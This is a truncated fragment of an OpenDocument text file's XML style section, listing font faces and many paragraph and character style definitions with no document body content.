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liberation mono', 'courier new', monospace"/>
    <style:font-face style:name="Monaco1" svg:font-family="Monaco, Consolas, 'Andale Mono', 'DejaVu Sans Mono', monospace"/>
    <style:font-face style:name="Monaco2" svg:font-family="Monaco, Menlo, Consolas, 'Courier New', monospace"/>
    <style:font-face style:name="Monaco" svg:font-family="Monaco, monospace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ato" svg:font-family="lat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aco" fo:font-size="13.5pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:paragraph-rsid="0031814e" fo:background-color="#f7f7f7" style:font-name-asian="Noto Sans Mono CJK SC" style:font-name-complex="Liberation Mono" loext:padding="0in" loext:border="none"/>
    </style:style>
    <style:style style:name="P2" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties style:font-name="Liberation Serif" fo:font-size="10pt" officeooo:rsid="000d817d" officeooo:paragraph-rsid="000ea113" style:font-size-asian="10pt" style:font-size-complex="10pt"/>
    </style:style>
    <style:style style:name="P3" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties officeooo:rsid="00355afd" officeooo:paragraph-rsid="00355afd"/>
    </style:style>
    <style:style style:name="P4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5" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="000d817d" officeooo:paragraph-rsid="000d817d"/>
    </style:style>
    <style:style style:name="P6" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="000d817d" officeooo:paragraph-rsid="00523c20"/>
    </style:style>
    <style:style style:name="P7" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="000ea113" officeooo:paragraph-rsid="000ea113"/>
    </style:style>
    <style:style style:name="P8" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:paragraph-rsid="000ea113"/>
    </style:style>
    <style:style style:name="P9" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="0011fa13" officeooo:paragraph-rsid="0011fa13"/>
    </style:style>
    <style:style style:name="P10" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="00141009" officeooo:paragraph-rsid="00141009"/>
    </style:style>
    <style:style style:name="P11" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="00141009" officeooo:paragraph-rsid="00181f3e"/>
    </style:style>
    <style:style style:name="P12" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="00170667" officeooo:paragraph-rsid="00170667"/>
    </style:style>
    <style:style style:name="P13" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="00170667" officeooo:paragraph-rsid="00423851"/>
    </style:style>
    <style:style style:name="P14" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:paragraph-rsid="00141009"/>
    </style:style>
    <style:style style:name="P15" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="00181f3e" officeooo:paragraph-rsid="00181f3e"/>
    </style:style>
    <style:style style:name="P16" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="0019d7c6" officeooo:paragraph-rsid="0019d7c6"/>
    </style:style>
    <style:style style:name="P17" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="001ae19f" officeooo:paragraph-rsid="001ae19f"/>
    </style:style>
    <style:style style:name="P18" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="0021b1cf" officeooo:paragraph-rsid="0021b1cf"/>
    </style:style>
    <style:style style:name="P19" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="00237023" officeooo:paragraph-rsid="00237023"/>
    </style:style>
    <style:style style:name="P20" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="0024a733" officeooo:paragraph-rsid="0024a733"/>
    </style:style>
    <style:style style:name="P21" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:paragraph-rsid="0024a733"/>
    </style:style>
    <style:style style:name="P22" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#545454" style:font-name="Consolas" fo:font-size="10.5pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:paragraph-rsid="0024a733"/>
    </style:style>
    <style:style style:name="P23" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#545454" style:font-name="Consolas" fo:font-size="10.5pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="0025796b" officeooo:paragraph-rsid="0025796b"/>
    </style:style>
    <style:style style:name="P24" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#545454" style:font-name="Consolas" fo:font-size="10.5pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="002b937c" officeooo:paragraph-rsid="002b937c"/>
    </style:style>
    <style:style style:name="P25" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#5e6065" style:font-name="Menlo" fo:font-size="10.5pt" fo:letter-spacing="0.0102in" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="002dda6a" officeooo:paragraph-rsid="002dda6a"/>
    </style:style>
    <style:style style:name="P26" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" style:font-name="Monaco" fo:font-size="13.5pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:paragraph-rsid="0031814e" fo:background-color="#f7f7f7" style:font-name-asian="Noto Sans Mono CJK SC" style:font-name-complex="Liberation Mono" loext:padding="0in" loext:border="none"/>
    </style:style>
    <style:style style:name="P27" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" style:font-name="Consolas1" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="00355afd" officeooo:paragraph-rsid="00355afd"/>
    </style:style>
    <style:style style:name="P28" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" style:font-name="Consolas1" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="00355afd" officeooo:paragraph-rsid="0038a754"/>
    </style:style>
    <style:style style:name="P29" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" style:font-name="Consolas1" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="003722bf" officeooo:paragraph-rsid="003722bf"/>
    </style:style>
    <style:style style:name="P30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81f3e"/>
    </style:style>
    <style:style style:name="P31" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#373737" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="000d817d" officeooo:paragraph-rsid="000ea113"/>
    </style:style>
    <style:style style:name="P32" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#373737" style:font-name="monospace" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="0010cd18" officeooo:paragraph-rsid="000ea113"/>
    </style:style>
    <style:style style:name="P33" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="002a45d9" officeooo:paragraph-rsid="002a45d9"/>
    </style:style>
    <style:style style:name="P34" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="002cdb5d" officeooo:paragraph-rsid="002cdb5d"/>
    </style:style>
    <style:style style:name="P35" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="002d1be6" officeooo:paragraph-rsid="002d1be6"/>
    </style:style>
    <style:style style:name="P36" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="002dda6a" officeooo:paragraph-rsid="002dda6a"/>
    </style:style>
    <style:style style:name="P37" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="002e870f" officeooo:paragraph-rsid="002e870f"/>
    </style:style>
    <style:style style:name="P38" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="003011d6" officeooo:paragraph-rsid="003011d6"/>
    </style:style>
    <style:style style:name="P39" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:paragraph-rsid="003011d6"/>
    </style:style>
    <style:style style:name="P40" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:paragraph-rsid="00339d57"/>
    </style:style>
    <style:style style:name="P41" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="00355afd" officeooo:paragraph-rsid="00355afd"/>
    </style:style>
    <style:style style:name="P42" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="00397e42" officeooo:paragraph-rsid="00397e42"/>
    </style:style>
    <style:style style:name="P43" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="003c83af" officeooo:paragraph-rsid="003c83af"/>
    </style:style>
    <style:style style:name="P44" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="003e064d" officeooo:paragraph-rsid="003e064d"/>
    </style:style>
    <style:style style:name="P45" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="003eca6d" officeooo:paragraph-rsid="003eca6d"/>
    </style:style>
    <style:style style:name="P46" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="0041e380" officeooo:paragraph-rsid="0041e380"/>
    </style:style>
    <style:style style:name="P47" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="0042bd93" officeooo:paragraph-rsid="0042bd93"/>
    </style:style>
    <style:style style:name="P48" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="0044b5bf" officeooo:paragraph-rsid="0044b5bf"/>
    </style:style>
    <style:style style:name="P49" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="004bc14e" officeooo:paragraph-rsid="004bc14e"/>
    </style:style>
    <style:style style:name="P50" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="004c8cc3" officeooo:paragraph-rsid="004c8cc3"/>
    </style:style>
    <style:style style:name="P51" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="004d79c0" officeooo:paragraph-rsid="004d79c0"/>
    </style:style>
    <style:style style:name="P52" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="004d9e10" officeooo:paragraph-rsid="004d9e10"/>
    </style:style>
    <style:style style:name="P53" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:paragraph-rsid="00423851"/>
    </style:style>
    <style:style style:name="P54" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="00523c20" officeooo:paragraph-rsid="00523c20"/>
    </style:style>
    <style:style style:name="P55" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:paragraph-rsid="00523c20"/>
    </style:style>
    <style:style style:name="P56" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="0055cd4b" officeooo:paragraph-rsid="0079f871"/>
    </style:style>
    <style:style style:name="P57" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="005a54c2" officeooo:paragraph-rsid="000d817d"/>
    </style:style>
    <style:style style:name="P58" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="005a54c2" officeooo:paragraph-rsid="005a54c2"/>
    </style:style>
    <style:style style:name="P59" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="005b86b4" officeooo:paragraph-rsid="005b86b4"/>
    </style:style>
    <style:style style:name="P60" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="005cd9e8" officeooo:paragraph-rsid="005cd9e8"/>
    </style:style>
    <style:style style:name="P61" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="00609905" officeooo:paragraph-rsid="0066b518"/>
    </style:style>
    <style:style style:name="P62" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="0060b1b5" officeooo:paragraph-rsid="0060b1b5"/>
    </style:style>
    <style:style style:name="P63" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="006ade1b" officeooo:paragraph-rsid="006ade1b"/>
    </style:style>
    <style:style style:name="P64" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="006ade1b" officeooo:paragraph-rsid="006b43b4"/>
    </style:style>
    <style:style style:name="P65" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="006ade1b" officeooo:paragraph-rsid="006f9525"/>
    </style:style>
    <style:style style:name="P66" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="006ade1b" officeooo:paragraph-rsid="007105f4"/>
    </style:style>
    <style:style style:name="P67" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="006ade1b" officeooo:paragraph-rsid="0076d908"/>
    </style:style>
    <style:style style:name="P68" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="006b43b4" officeooo:paragraph-rsid="006b43b4"/>
    </style:style>
    <style:style style:name="P69" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="006f9525" officeooo:paragraph-rsid="006f9525"/>
    </style:style>
    <style:style style:name="P70" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="007105f4" officeooo:paragraph-rsid="007105f4"/>
    </style:style>
    <style:style style:name="P71" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:paragraph-rsid="006ade1b"/>
    </style:style>
    <style:style style:name="P72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73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81f3e"/>
    </style:style>
    <style:style style:name="P74" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#55585a" style:font-name="Roboto" fo:font-size="13.5pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="000d817d" officeooo:paragraph-rsid="00831030"/>
    </style:style>
    <style:style style:name="P75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23c20" officeooo:paragraph-rsid="00523c20" fo:background-color="#f6f8fa" style:font-size-asian="12pt" style:font-size-complex="12pt" loext:padding="0in" loext:border="none"/>
    </style:style>
    <style:style style:name="P76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3e1ae" officeooo:paragraph-rsid="00523c20" fo:background-color="#f6f8fa" style:font-size-asian="12pt" style:font-size-complex="12pt" loext:padding="0in" loext:border="none"/>
    </style:style>
    <style:style style:name="P77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9a57c8" officeooo:paragraph-rsid="00ba8779" fo:background-color="#f6f8fa" style:font-size-asian="12pt" style:font-size-complex="12pt" loext:padding="0in" loext:border="none"/>
    </style:style>
    <style:style style:name="P78" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="0065500b" officeooo:paragraph-rsid="0066b518"/>
    </style:style>
    <style:style style:name="P79" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="006ade1b" officeooo:paragraph-rsid="0076d908"/>
    </style:style>
    <style:style style:name="P80" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="006ade1b" officeooo:paragraph-rsid="006ade1b"/>
    </style:style>
    <style:style style:name="P81" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="0021b1cf" officeooo:paragraph-rsid="00170667"/>
    </style:style>
    <style:style style:name="P82" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:paragraph-rsid="00181f3e"/>
    </style:style>
    <style:style style:name="P83" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="000d817d" officeooo:paragraph-rsid="000d817d"/>
    </style:style>
    <style:style style:name="P84" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="00831030" officeooo:paragraph-rsid="00831030"/>
    </style:style>
    <style:style style:name="P85" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="006b43b4" officeooo:paragraph-rsid="006b43b4"/>
    </style:style>
    <style:style style:name="P86" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-weight="bold" officeooo:rsid="0088c969" officeooo:paragraph-rsid="0088c969" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P87" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:paragraph-rsid="0076d908"/>
    </style:style>
    <style:style style:name="P88" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="008c30ab" officeooo:paragraph-rsid="008c30ab"/>
    </style:style>
    <style:style style:name="P89" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:paragraph-rsid="008c30ab"/>
    </style:style>
    <style:style style:name="P90" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="0060b1b5" officeooo:paragraph-rsid="0060b1b5"/>
    </style:style>
    <style:style style:name="P91" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="0060b1b5" officeooo:paragraph-rsid="00a1e653"/>
    </style:style>
    <style:style style:name="P92" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties style:font-name="Liberation Serif" fo:font-size="12pt" officeooo:paragraph-rsid="00523c20" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="P93" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties style:font-name="Liberation Serif" fo:font-size="12pt" officeooo:paragraph-rsid="005cd9e8" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="P94" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties style:font-name="Liberation Serif" fo:font-size="12pt" officeooo:rsid="000d817d" officeooo:paragraph-rsid="00523c20" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="P95" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="00170667" officeooo:paragraph-rsid="00170667"/>
    </style:style>
    <style:style style:name="P96" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="009c8fba" officeooo:paragraph-rsid="009c8fba"/>
    </style:style>
    <style:style style:name="P97" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:paragraph-rsid="00a03d04"/>
    </style:style>
    <style:style style:name="P98" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="00a1e653" officeooo:paragraph-rsid="00a1e653"/>
    </style:style>
    <style:style style:name="P99" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:paragraph-rsid="00a5b060"/>
    </style:style>
    <style:style style:name="P100" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="00a7bab7" officeooo:paragraph-rsid="00a7bab7"/>
    </style:style>
    <style:style style:name="P101" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:paragraph-rsid="00a7bab7"/>
    </style:style>
    <style:style style:name="T1" style:family="text">
      <style:text-properties officeooo:rsid="000ea113"/>
    </style:style>
    <style:style style:name="T2" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#373737" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="000d817d"/>
    </style:style>
    <style:style style:name="T3" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#333333" style:font-name="lato" fo:font-size="12pt" fo:letter-spacing="0.0102in" fo:font-style="normal" fo:font-weight="normal"/>
    </style:style>
    <style:style style:name="T4" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#e0276a" style:font-name="Consolas" fo:font-size="9.75pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" fo:background-color="#f2f2f2" loext:char-shading-value="0" loext:padding="0in" loext:border="none"/>
    </style:style>
    <style:style style:name="T5" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#545454" fo:letter-spacing="normal"/>
    </style:style>
    <style:style style:name="T6" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#545454" style:font-name="Consolas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3.5pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" fo:background-color="#f7f7f7" loext:char-shading-value="0" loext:padding="0in" loext:border="none"/>
    </style:style>
    <style:style style:name="T8" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" style:font-name="Monaco" fo:font-size="13.5pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="003011d6" fo:background-color="#f7f7f7" loext:char-shading-value="0" loext:padding="0in" loext:border="none"/>
    </style:style>
    <style:style style:name="T9" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" style:font-name="Monaco" fo:font-size="13.5pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="00339d57" fo:background-color="#f7f7f7" loext:char-shading-value="0" loext:padding="0in" loext:border="none"/>
    </style:style>
    <style:style style:name="T10" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" style:font-name="Monaco1" fo:font-size="11.2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" fo:font-size="9.75pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="00831030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14" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#005cc5" style:font-name="SFMono-Regular" fo:font-size="9.75pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal"/>
    </style:style>
    <style:style style:name="T15" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" style:text-underline-style="none" fo:font-weight="normal" fo:background-color="#f6f8fa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523c20" fo:background-color="#f6f8fa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94e3eb" fo:background-color="#f6f8fa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523c20" fo:background-color="#f6f8fa" loext:char-shading-value="0" loext:padding="0in" loext:border="none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95e05c" fo:background-color="#f6f8fa" loext:char-shading-value="0" loext:padding="0in" loext:border="none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53978b" fo:background-color="#f6f8fa" loext:char-shading-value="0" loext:padding="0in" loext:border="none"/>
    </style:style>
    <style:style style:name="T21" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:letter-spacing="normal" fo:font-style="normal" style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="005cd9e8" fo:background-color="#f6f8fa" loext:char-shading-value="0" loext:padding="0in" loext:border="none"/>
    </style:style>
    <style:style style:name="T22" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:letter-spacing="normal" fo:font-style="normal" style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="005e8d23" fo:background-color="#f6f8fa" loext:char-shading-value="0" loext:padding="0in" loext:border="none"/>
    </style:style>
    <style:style style:name="T23" style:family="text">
      <style:text-properties style:font-name="Liberation Serif" officeooo:rsid="000d817d"/>
    </style:style>
    <style:style style:name="T24" style:family="text">
      <style:text-properties officeooo:rsid="00132645"/>
    </style:style>
    <style:style style:name="T25" style:family="text">
      <style:text-properties officeooo:rsid="00141009"/>
    </style:style>
    <style:style style:name="T26" style:family="text">
      <style:text-properties officeooo:rsid="0015aa68"/>
    </style:style>
    <style:style style:name="T27" style:family="text">
      <style:text-properties officeooo:rsid="00181f3e"/>
    </style:style>
    <style:style style:name="T28" style:family="text">
      <style:text-properties fo:color="#d73a49"/>
    </style:style>
    <style:style style:name="T29" style:family="text">
      <style:text-properties fo:color="#005cc5"/>
    </style:style>
    <style:style style:name="T30" style:family="text">
      <style:text-properties officeooo:rsid="0024a733"/>
    </style:style>
    <style:style style:name="T31" style:family="text">
      <style:text-properties fo:color="#666a71" fo:font-size="9.75pt" fo:background-color="#f2f2f2" loext:char-shading-value="0" loext:padding="0in" loext:border="none"/>
    </style:style>
    <style:style style:name="T32" style:family="text">
      <style:text-properties fo:color="#0069ff" fo:font-size="9.75pt" fo:background-color="#f2f2f2" loext:char-shading-value="0" loext:padding="0in" loext:border="none"/>
    </style:style>
    <style:style style:name="T33" style:family="text">
      <style:text-properties fo:color="#08966b" fo:font-size="9.75pt" fo:background-color="#f2f2f2" loext:char-shading-value="0" loext:padding="0in" loext:border="none"/>
    </style:style>
    <style:style style:name="T34" style:family="text">
      <style:text-properties fo:color="#1a202c" style:font-name="SFMono-Regular1"/>
    </style:style>
    <style:style style:name="T35" style:family="text">
      <style:text-properties fo:color="#1a202c" style:font-name="SFMono-Regular1" fo:font-size="9.75pt"/>
    </style:style>
    <style:style style:name="T36" style:family="text">
      <style:text-properties fo:color="#333333" style:font-name="Monaco2" fo:font-size="9.75pt"/>
    </style:style>
    <style:style style:name="T37" style:family="text">
      <style:text-properties fo:color="#333333" fo:font-size="9.75pt"/>
    </style:style>
    <style:style style:name="T38" style:family="text">
      <style:text-properties officeooo:rsid="0033ef59"/>
    </style:style>
    <style:style style:name="T39" style:family="text">
      <style:text-properties officeooo:rsid="0040a276"/>
    </style:style>
    <style:style style:name="T40" style:family="text">
      <style:text-properties officeooo:rsid="00423851"/>
    </style:style>
    <style:style style:name="T41" style:family="text">
      <style:text-properties officeooo:rsid="00459775"/>
    </style:style>
    <style:style style:name="T42" style:family="text">
      <style:text-properties officeooo:rsid="0049e46b"/>
    </style:style>
    <style:style style:name="T43" style:family="text">
      <style:text-properties officeooo:rsid="004a5a96"/>
    </style:style>
    <style:style style:name="T44" style:family="text">
      <style:text-properties officeooo:rsid="00170667"/>
    </style:style>
    <style:style style:name="T45" style:family="text">
      <style:text-properties officeooo:rsid="0050491d"/>
    </style:style>
    <style:style style:name="T46" style:family="text">
      <style:text-properties officeooo:rsid="00523c20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64a015" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T49" style:family="text">
      <style:text-properties officeooo:rsid="0060b1b5"/>
    </style:style>
    <style:style style:name="T50" style:family="text">
      <style:text-properties officeooo:rsid="006256ad"/>
    </style:style>
    <style:style style:name="T51" style:family="text">
      <style:text-properties officeooo:rsid="0064dee4"/>
    </style:style>
    <style:style style:name="T52" style:family="text">
      <style:text-properties officeooo:rsid="0064f67a"/>
    </style:style>
    <style:style style:name="T53" style:family="text">
      <style:text-properties officeooo:rsid="0065500b"/>
    </style:style>
    <style:style style:name="T54" style:family="text">
      <style:text-properties officeooo:rsid="00664ccd"/>
    </style:style>
    <style:style style:name="T55" style:family="text">
      <style:text-properties officeooo:rsid="0066b518"/>
    </style:style>
    <style:style style:name="T56" style:family="text">
      <style:text-properties officeooo:rsid="006ade1b"/>
    </style:style>
    <style:style style:name="T57" style:family="text">
      <style:text-properties officeooo:rsid="006e1381"/>
    </style:style>
    <style:style style:name="T58" style:family="text">
      <style:text-properties officeooo:rsid="00798105"/>
    </style:style>
    <style:style style:name="T59" style:family="text">
      <style:text-properties officeooo:rsid="007d4378"/>
    </style:style>
    <style:style style:name="T60" style:family="text">
      <style:text-properties officeooo:rsid="007fccb1"/>
    </style:style>
    <style:style style:name="T61" style:family="text">
      <style:text-properties officeooo:rsid="00849249"/>
    </style:style>
    <style:style style:name="T62" style:family="text">
      <style:text-properties officeooo:rsid="0076d908"/>
    </style:style>
    <style:style style:name="T63" style:family="text">
      <style:text-properties officeooo:rsid="008b555d"/>
    </style:style>
    <style:style style:name="T64" style:family="text">
      <style:text-properties officeooo:rsid="008bdb2f"/>
    </style:style>
    <style:style style:name="T65" style:family="text">
      <style:text-properties officeooo:rsid="008c30ab"/>
    </style:style>
    <style:style style:name="T66" style:family="text">
      <style:text-properties officeooo:rsid="0093a675"/>
    </style:style>
    <style:style style:name="T67" style:family="text">
      <style:text-properties officeooo:rsid="00966f79"/>
    </style:style>
    <style:style style:name="T68" style:family="text">
      <style:text-properties officeooo:rsid="00983c12"/>
    </style:style>
    <style:style style:name="T69" style:family="text">
      <style:text-properties style:font-name="Liberation Serif" fo:font-size="12pt" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="T70" style:family="text">
      <style:text-properties style:font-name="Liberation Serif" fo:font-size="12pt" officeooo:rsid="00523c20" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="T71" style:family="text">
      <style:text-properties officeooo:rsid="009b34a5"/>
    </style:style>
    <style:style style:name="T72" style:family="text">
      <style:text-properties officeooo:rsid="009c8fba"/>
    </style:style>
    <style:style style:name="T73" style:family="text">
      <style:text-properties officeooo:rsid="009c9908"/>
    </style:style>
    <style:style style:name="T74" style:family="text">
      <style:text-properties officeooo:rsid="00a03d04"/>
    </style:style>
    <style:style style:name="T75" style:family="text">
      <style:text-properties officeooo:rsid="00a3b63c"/>
    </style:style>
    <style:style style:name="T76" style:family="text">
      <style:text-properties officeooo:rsid="00a41bd5"/>
    </style:style>
    <style:style style:name="T77" style:family="text">
      <style:text-properties officeooo:rsid="00a5b060"/>
    </style:style>
    <style:style style:name="T78" style:family="text">
      <style:text-properties officeooo:rsid="00a5bbd1"/>
    </style:style>
    <style:style style:name="T79" style:family="text">
